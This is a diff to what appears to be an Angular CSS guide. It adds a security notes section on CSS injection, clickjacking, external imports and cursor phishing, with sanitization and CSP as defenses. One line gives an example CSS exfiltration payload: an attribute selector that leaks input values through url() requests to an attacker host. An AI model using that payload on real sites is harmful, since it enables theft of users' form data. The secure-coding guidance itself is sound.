@@ -136,6 +136,19 @@ Angular rewrites `.card` to `.card[_nghost-abc123]` — it only applies inside t
 
 ---
 
+## Security Notes
+
+CSS can be a security vector in several ways:
+
+- **CSS injection** — if user input is reflected into a `<style>` tag or inline `style` attribute without sanitization, an attacker can exfiltrate data using CSS attribute selectors with external `url()` requests (e.g., `input[value^="a"] { background: url('//attacker.com/a') }`). Angular's template sanitizer prevents this for bindings, but server-side templating without escaping does not.
+- **Clickjacking via CSS** — `opacity: 0` or `z-index` stacking can overlay invisible elements on top of visible ones to hijack clicks. The server-side defense is `X-Frame-Options` and `Content-Security-Policy: frame-ancestors`.
+- **`@import` from external sources** — loading CSS from untrusted domains can introduce malicious rules. Use Content Security Policy `style-src` directives to restrict CSS origins.
+- **`cursor: url()`** — malicious CSS can replace the cursor with a crafted image to create phishing UI. Angular's `DomSanitizer` blocks `url()` values in styles by default.
+
+Angular's built-in protection: template bindings (`[style]`, `[class]`) are sanitized. Only `bypassSecurityTrustStyle()` disables this — never call it on user-controlled values.
+
+---
+
 ## Accessibility Notes
 
 - Color must not be the only way to convey information (WCAG 1.4.1)
